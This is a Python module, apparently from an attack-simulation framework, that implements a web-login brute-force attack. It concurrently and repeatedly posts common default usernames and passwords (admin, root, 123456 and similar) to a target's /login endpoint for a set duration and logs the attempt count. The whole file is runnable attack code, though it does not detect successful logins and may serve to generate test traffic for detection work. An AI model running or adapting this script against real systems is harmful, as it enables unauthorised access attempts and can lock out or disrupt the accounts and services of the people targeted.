"""Web Brute Force attack implementation"""

import asyncio
import aiohttp
import logging
from .base_attack import BaseAttack

logger = logging.getLogger(__name__)


class BruteForceWeb(BaseAttack):
    """Web login brute force attack"""
    
    def get_attack_type(self) -> str:
        return "Brute Force -Web"
    
    def get_default_port(self) -> int:
        return 80
    
    async def _try_login(self, session, username, password):
        """Attempt web login"""
        port = self.target_port or self.get_default_port()
        url = f"http://{self.target_ip}:{port}/login"
        
        data = {
            'username': username,
            'password': password
        }
        
        try:
            async with session.post(url, data=data, timeout=5) as response:
                await response.read()
                self.packets_sent += 1
        except Exception:
            pass
    
    async def _execute_attack(self):
        """Execute web brute force"""
        duration = self.parameters.get('duration', 300)
        
        usernames = ['admin', 'user', 'test', 'root', 'administrator']
        passwords = ['password', '123456', 'admin', 'test', 'password123']
        
        logger.info(f"BruteForce-Web: Starting attack on {self.target_ip}")
        
        async with aiohttp.ClientSession() as session:
            start_time = asyncio.get_event_loop().time()
            
            while (asyncio.get_event_loop().time() - start_time) < duration:
                tasks = []
                for username in usernames:
                    for password in passwords:
                        task = self._try_login(session, username, password)
                        tasks.append(task)
                
                await asyncio.gather(*tasks, return_exceptions=True)
                
                if self.packets_sent % 100 == 0:
                    logger.info(f"BruteForce-Web: {self.packets_sent} attempts")
                
                await asyncio.sleep(0.5)
        
        logger.info(f"BruteForce-Web: Attack complete. Total attempts: {self.packets_sent}")

